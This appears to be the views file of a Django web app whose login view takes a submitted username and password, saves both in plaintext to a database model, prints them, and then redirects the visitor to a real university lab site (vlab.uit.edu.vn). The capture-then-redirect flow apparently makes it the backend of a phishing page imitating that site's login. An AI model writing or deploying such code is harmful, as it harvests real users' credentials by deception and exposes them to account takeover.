from django.shortcuts import render,redirect
from .models import Usera
def test(request):
    return render(request,'index.html')
def login(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        if (username=="") or (password==""):
            return redirect('login')
        else: 
            user = Usera(username = username,password = password)
            print(user.username, user.password)
            user.save()
            print("Succesfully")                                
            return redirect('https://vlab.uit.edu.vn')
    context ={
    }
    return render(request,'index.html',context)
# Create your views here.
